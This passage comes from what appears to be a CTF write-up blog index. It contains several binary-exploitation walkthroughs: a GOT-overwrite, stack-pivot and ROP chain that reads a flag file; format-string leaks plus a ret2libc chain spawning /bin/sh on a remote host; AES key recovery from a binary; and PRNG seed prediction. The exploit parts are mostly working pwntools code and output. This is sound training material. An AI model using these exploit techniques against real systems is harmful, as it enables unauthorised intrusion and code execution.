→ 0x401070 [0x404040] printf@GLIBC_2.2.5 → 0x401080 [0x404048] srand@GLIBC_2.2.5 → 0x401090 [0x404050] time@GLIBC_2.2.5 → 0x4010a0 [0x404058] setvbuf@GLIBC_2.2.5 → 0x4010b0 [0x404060] __isoc99_scanf@GLIBC_2.7 → 0x4010c0 [0x404068] rand@GLIBC_2.2.5 → 0x4010d0  The above values are the GOT entries when the program starts. None of them is resolved because they have not been called yet. Let\u0026rsquo;s set a breakpoint before closing the program and check again the GOT:\ngef➤ break *0x401555 Breakpoint 1 at 0x401555 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 2 Good bye! Breakpoint 1, 0x0000000000401555 in ?? ()  gef➤ got GOT protection: Partial RelRO | GOT functions: 11 [0x404018] seccomp_init → 0x7ffff7f94780 [0x404020] seccomp_rule_add → 0x7ffff7f94e50 [0x404028] puts@GLIBC_2.2.5 → 0x7ffff7e24450 [0x404030] seccomp_load → 0x7ffff7f94a90 [0x404038] __stack_chk_fail@GLIBC_2.4 → 0x401070 [0x404040] printf@GLIBC_2.2.5 → 0x7ffff7e01cc0 [0x404048] srand@GLIBC_2.2.5 → 0x401090 [0x404050] time@GLIBC_2.2.5 → 0x4010a0 [0x404058] setvbuf@GLIBC_2.2.5 → 0x7ffff7e24d10 [0x404060] __isoc99_scanf@GLIBC_2.7 → 0x7ffff7e030e0 [0x404068] rand@GLIBC_2.2.5 → 0x4010d0  The ones in green are already resolved. And the ones in yellow are not resolved because hte have not been called up to this point of execution.\nInitialy, I modified the entry for __stack_chk_fail by the entry for rand. So I only needed to modify one byte (namely, change 0x70 for 0xd0).\nAgain, we need to calculate the offset to this address. This time is easier because we know $rbp = 0x404200. So the offset we need to reach 0x404038 (GOT entry for __stack_chk_fail) is -0x200 + 0x38 + 0x20 (recall that the base address for the \u0026ldquo;write-what-where\u0026rdquo; primitive is $rbp - 0x20). So we have to add this line of code:\nwrite_what_where(p, 0xd0, -0x200 + 0x38 + 0x20)  At this point, I started testing the second ROP chain. But\u0026hellip; It didn\u0026rsquo;t work either because the $rsp was pointing to stack addresses, so I was not able to modify the return instruction (which is stored in the stack) because $rbp points to the binary address space (there are no fix offsets between the stack address space, the binary and Glibc).\nAgain, another problem. To solve it, since $rbp is forced to be set to a valid address and we only have the binary addresses, we need to change $rsp as well. This technique is called Stack Pivot, and consists of moving the stack pointer to a controlled address space.\nIn order to perform a Stack Pivot, we need a gadget like leave; ret, which is equivalent to mov rsp, rbp; pop rbp; ret. Fortunately, we have this gadget in the binary:\n$ ROPgadget --binary scrambler | grep ': leave ; ret$' 0x0000000000401387 : leave ; ret  Therefore, instead of forging __stack_chk_fail to be rand, we can forge it to contain the address of the leave; ret gadget and perform the Stack Pivot technique. For that, we need to modify two bytes: 0x70 to be 0x87 and 0x10 to be 0x13, which is done with these lines of code (that replace the previous one):\nwrite_what_where(p, 0x87, -0x200 + 0x38 + 0x20) write_what_where(p, 0x13, -0x200 + 0x38 + 0x20 + 1)  Surprisingly, everything is working as expected. Now we get an interactive process and the saved return address will be taken from the new stack, which is within the binary addresses. We need to do the trick to get unlimited \u0026ldquo;scrambles\u0026rdquo; again. Now it is time to perform the second ROP chain.\nThis ROP chain is a bit complex, so I\u0026rsquo;ll break it into pieces:\n Write \u0026quot;/home/ctf/flag.txt\u0026quot; at a known address Open the flag file Read the flag file and store its contents at a known address Print the contents of the flag file  Since we have leaked Glibc, we have access to a lot of useful gadgets and functions. One can get these gadgets using ROPgadget in the libc.so_1.6 file. These are all the gadgets we are going to need (appart from pop rdi; ret):\nmov_qword_ptr_rax_rdi_ret = glibc.address + 0x09a0ff pop_rax_ret = glibc.address + 0x047400 pop_rsi_ret = glibc.address + 0x02604f pop_rdx_pop_r12_ret = glibc.address + 0x119241 pop_rcx_pop_rbx_ret = glibc.address + 0x1025ae  For the first piece, we will use this payload in a loop:\nflag = b'/home/ctf/flag.txt' flag = flag.ljust(len(flag) + (8 - len(flag) % 8), b'\\0') writable_addr = 0x404000 payload = b'' # Store \"/home/ctf/flag.txt\" in writable_addr for i in range(0, len(flag), 8): payload += p64(pop_rdi_ret) payload += flag[i:i + 8] payload += p64(pop_rax_ret) payload += p64(writable_addr + i) payload += p64(mov_qword_ptr_rax_rdi_ret)  The flag filename string is padded with null bytes to have a length that is divisible by 8. Then, we are storing the string in chunks of 8 bytes in a writable address (namely, 0x404000). The process uses mov qword ptr [rax], rdi; ret to store the contents of $rdi into the address pointed to by $rax. GDB might be useful to follow the ROP chain and make sure that the string is stored correctly.\nAfter that, we must call open(\u0026quot;/home/ctf/flag.txt\u0026quot;, O_RDONLY). Notice that O_RDONLY is just an alias for 0 and that we know the address of the filename string.\nAt first, I was using directly the open function from Glibc, but seccomp rules were blocking the process. Maybe that function uses more system calls. Then I looked for a syscall gadget: the binary does not contain any syscall and Glibc has a lot, but none of them end in ret, so we can\u0026rsquo;t use them for the ROP chain:\n$ ROPgadget --binary scrambler | grep syscall $ ROPgadget --binary libc.so_1.6 | grep syscall | wc -c 153930 $ ROPgadget --binary libc.so_1.6 | grep syscall | grep ret$  Again, a dead end\u0026hellip; But then I realized that Glibc has a function called precisely syscall:\n$ readelf -s libc.so_1.6 | grep syscall 1980: 0000000000118750 55 FUNC GLOBAL DEFAULT 15 syscall@@GLIBC_2.2.5  So maybe we can use that function call in the ROP chain, that would solve the problem. One thing to take into account is that the values of the registers to execute a syscall ($rax, $rdi, $rsi, $rdx, $rcx\u0026hellip;) are passed to the function syscall as arguments, so the $rdi = $rax, $rsi = $rdi, $rdx = $rsi, $rcx = $rdx\u0026hellip; It can be a bit confusing, so I added some comments in the code:\n# syscall: open(\"/home/ctf/flag.txt\", 0) payload += p64(pop_rdi_ret) payload += p64(2) # rdi (rax) payload += p64(pop_rsi_ret) payload += p64(writable_addr) # rsi (rdi) payload += p64(pop_rdx_pop_r12_ret) payload += p64(0) # rdx (rsi) payload += p64(0) payload += p64(syscall)  The instruction sys_open is executed when $rax = 2. Next, we must use sys_read ($rax = 0). The file descriptor will be 3 (because 0, 1 and 2 are reserved ones for stdin, stdout and stderr). Anyway, one can check the file descriptor number when executing sys_open, the resulting file descriptor will be returned in $rax (and it is 3). So here is the sys_read ROP chain:\n# syscall: read(3, writable_addr, 0x100) payload += p64(pop_rdi_ret) payload += p64(0) # rdi (rax) payload += p64(pop_rsi_ret) payload += p64(3) # rsi (rdi) payload += p64(pop_rdx_pop_r12_ret) payload += p64(writable_addr) # rdx (rsi) payload += p64(0) payload += p64(pop_rcx_pop_rbx_ret) payload += p64(0x100) # rcx (rdx) payload += p64(0) payload += p64(syscall)  The number 0x100 is just to specify the amount of bytes to read from the file descriptor (presumably, we won\u0026rsquo;t need that much).\nFinally, to print out the flag, we could have used sys_write (following the same syscall ROP chain procedure), but I found it easier to use puts:\n# puts(writable_addr) payload += p64(pop_rdi_ret) payload += p64(writable_addr) payload += p64(glibc.sym.puts)  And that\u0026rsquo;s it. Now we only need to use the \u0026ldquo;write-what-where\u0026rdquo; primitive the same way we did for the first ROP chain and run it using option 2.\nLet\u0026rsquo;s try locally:\n$ echo 'flag{this_is_the_flag!!}' \u0026gt; /home/ctf/flag.txt $ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 447414 [*] Leaked puts() address: 0x7f028c526450 [*] Glibc base address: 0x7f028c4a2000 [*] Switching to interactive mode Good bye! flag{this_is_the_flag!!} gi\\x8c\\x7f [*] Got EOF while reading in interactive $  It works!! Let\u0026rsquo;s try remotely (it can take some time to run, around 10 minutes):\n$ python3 solve.py 20.203.124.220 1235 [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Opening connection to 20.203.124.220 on port 1235: Done [*] Leaked puts() address: 0x7f3c9865e450 [*] Glibc base address: 0x7f3c985da000 [*] Switching to interactive mode Good bye! Securinets{f8ee583021b816b1b557987ca120991a} \\x7f [*] Got EOF while reading in interactive $  The full exploit script can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/scrambler/","section":"ctf","summary":"Securinets Finals 2022. 64-bit binary. ROP. Ret2Libc. GOT overwrite. Stack Pivot. seccomp rules","time":22,"title":"scrambler"},{"contents":"SearchSearch for any keyword inside CTF or HTB solutions \u0026lt;- MAIN  Total: 0      let fuse const options = { findAllMatches: true, ignoreLocation: true, keys: ['title', 'summary', 'contents'], threshold: 0, } document.forms[0].addEventListener('submit', e = { e.preventDefault() executeSearch() }) function loadSearch() { fetch('\\/en\\/index.json').then(res = res.json()).then(data = { fuse = new Fuse(data, options) }) } function executeSearch() { const results = fuse.search(document.getElementById('search').value).filter(r = r.item.section !== 'imc') let searchitems = '' for (let result of results) { searchitems += `${result.item.section.toUpperCase()}${result.item.title}${result.item.summary}` } document.getElementById('searchResults').innerHTML = searchitems document.getElementById('post-count').innerText = results.length } loadSearch()  ","image":null,"permalink":"https://7rocky.github.io/en/search/","section":"","summary":null,"time":1,"title":"Search"},{"contents":"We are given a 64-bit binary called main:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  If we open the binary in Ghidra we see these functions:\nvoidget_name() { longin_FS_OFFSET; charname[40]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Please fill in your name:\"); read(0, name, 30); printf(\"Thank you \"); printf(name); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } } intmain() { longin_FS_OFFSET; charsecret[56]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setvbuf(stderr, NULL, 2, 0); setvbuf(stdout, NULL, 2, 0); get_name(); puts(\"So let\\'s get into business, give me a secret to exploit me :).\"); gets(secret); puts(\"Bye, good luck next time :D \"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  There are two vulnerabilities: a Buffer Overflow because of the use of gets, and a Format String vulnerability because of the use of printf with a controlled variable as first parameter.\nSince all protections are enabled, we will need to leak the stack canary, an address of the binary at runtime to bypass PIE and an address of Glibc to bypass ASLR.\nFor the moment, we can enumerate the Format String vulnerability:\n$ ./main Please fill in your name: %lx Thank you 7fffffffbff0 So let's get into business, give me a secret to exploit me :). ^C  The above is just a proof of concept, we have leaked a value from the stack when using %lx format. Let\u0026rsquo;s see what we can dump from the stack. For that, I made a little loop in shell script:\n$ for i in {1..30}; do echo -n \"$i: \"; echo \"%$i\\$lx\\n\" | ./main | head -2 | tail -1 | awk '{ print $3 }'; done 1: 7fffffffbff0 2: 0 3: 0 4: a 5: a 6: a0a786c243625 7: 7ffff7e41de5 8: 555555555310 9: 7fffffffe710 10: 555555555100 11: 63acce113dd9c300 12: 7fffffffe710 13: 5555555552c5 14: 7fffffffe6f6 15: 55555555535d 16: 7ffff7fae2e8 17: 555555555310 18: 0 19: 555555555100 20: 7fffffffe800 21: 23c748f15ffbef00 22: 0 23: 7ffff7de1083 24: 7ffff7ffc620 25: 7fffffffe808 26: 100000000 27: 555555555264 28: 555555555310 29: 774f9dc3d5661ab7 30: 555555555100  The stack canary is easy to recognize because is always random and ends in a null byte. We find it at position 11.\nThen, we can see some addresses that start with 555555555. Those are addresses within the binary (I disabled ASLR temporarily). The one at position 27 ends in 264, and it matches with the offset of main:\n$ readelf -s main | grep main 6: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.2.5 (2) 56: 0000000000000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 66: 0000000000001264 165 FUNC GLOBAL DEFAULT 16 main  So we got a way to leak the canary and the main address. Let\u0026rsquo;s start building the exploit in Python:\ndefget_canary_main_addr(p): p.sendlineafter(b'Please fill in your name:\\n', b'%11$lx.%27$lx') p.recvuntil(b'Thank you ') canary, main_addr=map(lambdax: int(x, 16), p.recvline().split(b'.')) log.info(f'Leaked canary: {hex(canary)}') log.info(f'Leaked main() address: {hex(main_addr)}') returncanary, main_addr defmain(): p=get_process() canary, main_addr=get_canary_main_addr(p) elf.address=main_addr-elf.sym.main log.info(f'ELF base address: {hex(elf.address)}') if__name__=='__main__': main()  $ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1642002 [*] Leaked canary: 0xfafefec6ed0f4e00 [*] Leaked main() address: 0x555555555264 [*] ELF base address: 0x555555554000 [*] Stopped process './main' (pid 1642002)  Everything alright. Now it is time to exploit the Buffer Overflow vulnerability.\nAlthough we could have got a leak of Glibc with the Format String vulnerability, I decided to perform a usual Ret2Libc attack with ASLR bypass. That is, call puts using the Procedure Linkage Table (PLT) setting as first argument the address of a function at the Global Offset Table (GOT), using Return Oriented Programming (ROP). I will use pwntools directly to save time:\nrop=ROP(elf) offset=56 junk=b'A'*offset leaked_function='setvbuf' payload=junk payload+=p64(canary) payload+=p64(0) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(elf.got[leaked_function]) payload+=p64(elf.plt.puts) payload+=p64(elf.sym.main) p.sendlineafter(b'So let\\'s get into business, give me a secret to exploit me :).\\n', payload) p.recvline() leaked_function_addr=u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked {leaked_function}() address: {hex(leaked_function_addr)}') glibc.address=leaked_function_addr-glibc.sym[leaked_function] log.info(f'Glibc base address: {hex(glibc.address)}')  $ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1644101 [*] Leaked canary: 0x45c2abc35c668400 [*] Leaked main() address: 0x555555555264 [*] ELF base address: 0x555555554000 [*] Loaded 14 cached gadgets for 'main' [*] Leaked setvbuf() address: 0x7ffff7e41ce0 [*] Glibc base address: 0x7ffff7dbd000 [*] Stopped process './main' (pid 1644101)  Perfect, and now that we have the base address of Glibc, we can call system(\u0026quot;/bin/sh\u0026quot;). Notice that we have returned to main, so we need to send another \u0026ldquo;name\u0026rdquo; before exploiting the Buffer Overflow vulnerability again:\np.sendline() payload=junk payload+=p64(canary) payload+=p64(0) payload+=p64(rop.find_gadget(['ret'])[0]) payload+=p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload+=p64(next(glibc.search(b'/bin/sh'))) payload+=p64(glibc.sym.system) p.sendlineafter(b'So let\\'s get into business, give me a secret to exploit me :).\\n', payload) p.recvline() p.interactive()  If I enable ASLR, everything works and I get a shell locally:\n$ python3 solve.py [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process './main': pid 1645479 [*] Leaked canary: 0x90b02c1284165b00 [*] Leaked main() address: 0x55f24178f264 [*] ELF base address: 0x55f24178e000 [*] Loaded 14 cached gadgets for 'main' [*] Leaked setvbuf() address: 0x7f11f3e87ce0 [*] Glibc base address: 0x7f11f3e03000 [*] Switching to interactive mode $ ls main solve.py  Now we need to run it on remote and find the correct Glibc version. Using two Glibc leaks, we get that the remote instance uses Glibc 2.27 (check libc.rip):\nWe could have also noticed that the Dockerfile started with FROM ubuntu:18.04.\nAfter tweaking the exploit, we get a shell on the remote instance:\n$ python3 solve.py blackhat2-a7c0aeda4583a436e729b57c9ff83838-0.chals.bh.ctf.sa [*] './main' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to blackhat2-a7c0aeda4583a436e729b57c9ff83838-0.chals.bh.ctf.sa on port 443: Done [*] Leaked canary: 0xf085d069ad9c9a00 [*] Leaked main() address: 0x55993e81a264 [*] ELF base address: 0x55993e819000 [*] Loading gadgets for './main' [*] Leaked setvbuf() address: 0x7f93c19df2a0 [*] Glibc base address: 0x7f93c195e000 [*] Switching to interactive mode $ cat flag.txt BlackHatMEA{96:21:9f27d3e8d68fd8bbfb5b88a969e6ff4054624b6c}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/other/secret-note/","section":"ctf","summary":"BlackHat MEA CTF 2022. 64-bit binary. Buffer Overflow. Format String vulnerability. Ret2Libc. PIE and canary bypass","time":5,"title":"Secret Note"},{"contents":"We are given a binary file called securetransfer:\n$ file securetransfer securetransfer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0457997eda987eb100de85a2954fc8b8fc660a53, for GNU/Linux 3.2.0, stripped  We also have a network capture file called trace.pcap.\nTraffic analysis Starting with trace.pcap, we can use Wireshark to analyze the network capture file:\nThere is only one TCP segment that has data:\n5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c  Reverse engineering We can use Ghidra to read the decompiled source code in C. This is the main function:\nintmain(intparam_1, longparam_2) { OPENSSL_init_crypto(2,0); OPENSSL_init_crypto(0xc, 0); OPENSSL_init_crypto(0x80, 0); if(param_1 ==3) { printf(\"Sending File: %sto %s\\n\", *(undefined8 *) (param_2 +0x10), *(undefined8 *) (param_2 +8)); send_encrypt(*(undefined8 *) (param_2 +8), *(undefined8 *) (param_2 +0x10)); } elseif(param_1 ==1) { puts(\"Receiving File\"); recv_decrypt(); } else{ puts(\"Usage ./securetransfer [\u0026lt;ip\u0026gt; \u0026lt;file\u0026gt;]\"); } return0; }  Basically, there are two options: encrypt a file and send it, or receive a file and decrypt it. We also see that it uses OpenSSL to construct the cipher.\nEncryption function Let\u0026rsquo;s take a look at send_encrypt:\nundefined8 send_encrypt(char*param_1, char*param_2) { int__fd; intiVar1; undefined8 uVar2; size_tsVar3; longin_FS_OFFSET; size_tlocal_50; FILE *local_48; ulong local_40; void*local_38; void*local_30; undefined local_28[4]; undefined local_24[20]; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); __fd =socket(2, 1, 0); if(__fd ==-1) { puts(\"ERROR: Socket creation failed\"); uVar2 =0; } else{ memset(local_28, 0, 0x10); local_28._0_2_ =2; iVar1 =inet_pton(2, param_1, local_24); if(iVar1 ==0) { printf(\"ERROR: Invalid input address \\'%s\\'\\n\", param_1); uVar2 =0; } else{ local_28._2_2_ =htons(0x539); iVar1 =connect(__fd, (sockaddr *) local_28, 0x10); if(iVar1 ==0) { local_48 =fopen(param_2, \"rb\"); if(local_48 ==NULL) { printf(\"ERROR: Can\\'t open the file \\'%s\\'\\n\", param_2); close(__fd); uVar2 =0; } else{ fseek(local_48, 0, 2); local_40 =ftell(local_48); fseek(local_48, 0, 0); if(local_40 \u0026lt;0x10) { puts(\"ERROR: File too small\"); fclose(local_48); close(__fd); uVar2 =0; } elseif(local_40 \u0026lt;0x1001) { local_38 =malloc(local_40); local_30 =malloc(local_40 *2); sVar3 =fread(local_38, 1, local_40, local_48); if(local_40 ==sVar3) { iVar1 =encrypt(local_38, local_40 \u0026amp;0xffffffff, local_30); local_50 =(size_t) iVar1; write(__fd, \u0026amp;local_50, 8); write(__fd, local_30, local_50); puts(\"File send...\"); free(local_30); free(local_38); fclose(local_48); close(__fd); uVar2 =1; } else{ puts(\"ERROR: Failed reading the file\"); free(local_30); free(local_38); fclose(local_48); close(__fd); uVar2 =0; } } else{ puts(\"ERROR: File too large\"); fclose(local_48); close(__fd); uVar2 =0; } } } else{ puts(\"ERROR: Connection failed\"); uVar2 =0; } } } if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } returnuVar2; }  This function reads the input file, encrypts it and sends it through a TCP socket. This is encrypt:\nintencrypt(uchar *param_1, intparam_2, uchar *param_3) { intiVar1; EVP_CIPHER *cipher; longin_FS_OFFSET; intlocal_50; intlocal_4c; char*local_48; EVP_CIPHER_CTX *local_40; uchar local_38; undefined local_37; undefined local_36; undefined local_35; undefined local_34; undefined local_33; undefined local_32; undefined local_31; undefined local_30; undefined local_2f; undefined local_2e; undefined local_2d; undefined local_2c; undefined local_2b; undefined local_2a; undefined local_29; undefined local_28; undefined local_27; undefined local_26; undefined local_25; undefined local_24; undefined local_23; undefined local_22; undefined local_21; undefined local_20; undefined local_1f; undefined local_1e; undefined local_1d; undefined local_1c; undefined local_1b; undefined local_1a; undefined local_19; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); local_38 ='s'; local_2f =0x65; local_2e =0x74; local_2d =0x6b; local_1d =0x74; local_1c =0x69; local_37 =0x75; local_36 =0x70; local_22 =0x6e; local_21 =99; local_1b =0x6f; local_32 =0x65; local_31 =99; local_33 =0x73; local_20 =0x72; local_1f =0x79; local_30 =0x72; local_26 =0x66; local_25 =0x6f; local_24 =0x72; local_1a =0x6e; local_2c =0x65; local_2b =0x79; local_2a =0x75; local_29 =0x73; local_28 =0x65; local_27 =100; local_23 =0x65; local_35 =0x65; local_34 =0x72; local_1e =0x70; local_19 =0x21; local_48 =\"someinitialvalue\"; local_40 =EVP_CIPHER_CTX_new(); if(local_40 ==NULL) { iVar1 =0; } else{ cipher =EVP_aes_256_cbc(); iVar1 =EVP_EncryptInit_ex(local_40, cipher, NULL, \u0026amp;local_38, (uchar *) local_48); if(iVar1 ==1) { iVar1 =EVP_EncryptUpdate(local_40, param_3, \u0026amp;local_50, param_1, param_2); if(iVar1 ==1) { local_4c =local_50; iVar1 =EVP_EncryptFinal_ex(local_40,param_3 +local_50, \u0026amp;local_50); if(iVar1 ==1) { local_4c =local_4c +local_50; EVP_CIPHER_CTX_free(local_40); iVar1 =local_4c; } else{ iVar1 =0; } } else{ iVar1 =0; } } else{ iVar1 =0; } } if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } returniVar1; }  It is quite a long function, but it only sets up a key byte by byte, and an initial value (IV) to create an AES CBC cipher. At this point, I took all the local_xx values and built the AES key. I tried to use this AES key along with the IV to decrypt the data from the TCP segment, but it was not correct.\nDecryption function Then I took a look at decrypt (called by recv_decrypt):\nintdecrypt(uchar *param_1, intparam_2, uchar *param_3) { intiVar1; EVP_CIPHER *cipher; longin_FS_OFFSET; intlocal_50; intlocal_4c; char*local_48; EVP_CIPHER_CTX *local_40; uchar local_38; undefined local_37; undefined local_36; undefined local_35; undefined local_34; undefined local_33; undefined local_32; undefined local_31; undefined local_30; undefined local_2f; undefined local_2e; undefined local_2d; undefined local_2c; undefined local_2b; undefined local_2a; undefined local_29; undefined local_28; undefined local_27; undefined local_26; undefined local_25; undefined local_24; undefined local_23; undefined local_22; undefined local_21; undefined local_20; undefined local_1f; undefined local_1e; undefined local_1d; undefined local_1c; undefined local_1b; undefined local_1a; undefined local_19; longlocal_10;  local_10 =*(long*) (in_FS_OFFSET +0x28); local_38 ='s'; local_2f =0x65; local_37 =0x75; local_36 =0x70; local_26 =0x66; local_25 =0x6f; local_24 =0x72; local_21 =99; local_2e =0x74; local_2d =0x6b; local_1d =0x74; local_1b =0x6f; local_32 =0x65; local_31 =99; local_33 =0x73; local_20 =0x72; local_2b =0x79; local_2a =0x75; local_29 =0x73; local_1c =0x69; local_28 =0x65; local_27 =100; local_23 =0x65; local_1f =0x79; local_30 =0x72; local_34 =0x72; local_1e =0x70; local_19 =0x21; local_1a =0x6e; local_2c =0x65; local_35 =0x65; local_22 =0x6e; local_48 =\"someinitialvalue\"; local_40 =EVP_CIPHER_CTX_new(); if(local_40 ==NULL) { iVar1 =0; } else{ cipher =EVP_aes_256_cbc(); iVar1 =EVP_DecryptInit_ex(local_40, cipher, NULL, \u0026amp;local_38, (uchar *) local_48); if(iVar1 ==1) { iVar1 =EVP_DecryptUpdate(local_40, param_3, \u0026amp;local_50, param_1, param_2); if(iVar1 ==1) { local_4c =local_50; iVar1 =EVP_DecryptFinal_ex(local_40, param_3 +local_50, \u0026amp;local_50); if(iVar1 ==1) { local_4c =local_4c +local_50; EVP_CIPHER_CTX_free(local_40); iVar1 =local_4c; } else{ iVar1 =0; } } else{ iVar1 =0; } } else{ iVar1 =0; } } if(local_10 !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } returniVar1; }  It looks very similar to encrypt. Indeed, AES is a symmetric algorithm, so the AES key is the same for encryption as for decryption.\nIf you compare encrypt and decrypt, you will see that the local_xx values are not in the same order, but we know that both AES key must be the same. Therefore, I realized that the local_xx values where just unsorted, so we need to sort them to build the AES key. This would be the correct ordering:\nlocal_19 =0x21; local_1a =0x6e; local_1b =0x6f; local_1c =0x69; local_1d =0x74; local_1e =0x70; local_1f =0x79; local_20 =0x72; local_21 =99; local_22 =0x6e; local_23 =0x65; local_24 =0x72; local_25 =0x6f; local_26 =0x66; local_27 =100; local_28 =0x65; local_29 =0x73; local_2a =0x75; local_2b =0x79; local_2c =0x65; local_2d =0x6b; local_2e =0x74; local_2f =0x65; local_30 =0x72; local_31 =99; local_32 =0x65; local_33 =0x73; local_34 =0x72; local_35 =0x65; local_36 =0x70; local_37 =0x75; local_38 ='s';  Flag At this point, we can take those values and switch to Python. Also, notice that the above ordering is in reverse order, because of endianness (little-endian):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; key = bytes([ ... 0x21, ... 0x6e, ... 0x6f, ... 0x69, ... 0x74, ... 0x70, ... 0x79, ... 0x72, ... 99, ... 0x6e, ... 0x65, ... 0x72, ... 0x6f, ... 0x66, ... 100, ... 0x65, ... 0x73, ... 0x75, ... 0x79, ... 0x65, ... 0x6b, ... 0x74, ... 0x65, ... 0x72, ... 99, ... 0x65, ... 0x73, ... 0x72, ... 0x65, ... 0x70, ... 0x75, ... ord('s'), ... ])[::-1] \u0026gt;\u0026gt;\u0026gt; iv = b'someinitialvalue' \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_CBC, iv) \u0026gt;\u0026gt;\u0026gt; data = bytes.fromhex('5f558867993dccc99879f7ca39c5e406972f84a3a9dd5d48972421ff375cb18c') \u0026gt;\u0026gt;\u0026gt; cipher.decrypt(data) b'HTB{vryS3CuR3_F1L3_TR4nsf3r}\\x04\\x04\\x04\\x04'  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/secured-transfer/","section":"ctf","summary":"Network traffic analysis with Wireshark. AES cipher","time":6,"title":"Secured Transfer"},{"contents":"We are given a 32-bit binary called seed_spring:\nArch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Reverse engineering This time we do not have the source code. However, we can use a reversing tool like Ghidra to decompile the binary into somewhat readable C source code. Here we have the main function:\nvoid main() { uint local_20; uint local_1c; uint local_18; int local_14; undefined *local_10; local_10 = \u0026amp;stack0x00000004; puts(\"\"); puts(\"...\"); puts(\"\"); puts(\"Welcome! The game is easy: you jump on a sPRiNG.\"); puts(\"How high will you fly?\"); puts(\"\"); fflush(stdout); local_18 = time((time_t *) 0x0); srand(local_18); local_14 = 1; while(true) { if (0x1e \u0026lt; local_14) { puts(\"Congratulation! You\\'ve won! Here is your flag:\\n\"); fflush(stdout); get_flag(); fflush(stdout); return 0; } printf(\"LEVEL (%d/30)\\n\", local_14); puts(\"\"); local_1c = rand(); local_1c = local_1c \u0026amp; 0xf; printf(\"Guess the height: \"); fflush(stdout); __isoc99_scanf(\"%d\", \u0026amp;local_20); fflush(stdin); if (local_1c != local_20) break; local_14 = local_14 + 1; } puts(\"WRONG! Sorry, better luck next time!\"); fflush(stdout); /* WARNING: Subroutine does not return */ exit(-1); }  What the program does is set a seed for a Pseudo Random Number Generator (PRNG) and then call rand 30 times. The AND operation with 0xf will be applied to the value returned from rand, and after that the program checks if the user input is equal to the result of the AND operation. If the result is correct, we continue to the next level. If not, the program exits.\nExploit development One way of knowing the exact random values that will be computed is to create the same PRNG and initialize it with the same seed. For that purpose, we can write a simple C program:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; int main() { int i; srand(time(0)); for (i = 0; i \u0026lt; 30; i++) { printf(\"%d\\n\", rand() \u0026amp; 0xf); } return 0; }  If we compile it and run it, we will see 30 generated random values:\n$ gcc -o prng prng.c $ ./prng 10 6 3 14 14 0 10 8 1 13 1 10 5 0 2 15 1 9 4 12 3 7 4 5 0 15 14 15 7 14  If we pipe this output to the seed_spring binary as input, we will win the game:\n$ ./prng | ./seed_spring # mmmmm mmmmm \" mm m mmm mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # # \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\" Welcome! The game is easy: you jump on a sPRiNG. How high will you fly? LEVEL (1/30) Guess the height: LEVEL (2/30) Guess the height: LEVEL (3/30) ... Guess the height: LEVEL (29/30) Guess the height: LEVEL (30/30) Guess the height: Congratulation! You've won! Here is your flag: cat: flag.txt: No such file or directory  Nice, the program is trying to execute cat flag.txt (it fails because we do not have a file called flag.txt).\nFlag Let\u0026rsquo;s do the same on the remote instance and see if it returns the flag:\n$ ./prng | nc jupiter.challenges.picoctf.org 35856 # mmmmm mmmmm \" mm m mmm mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm \"\"\"m 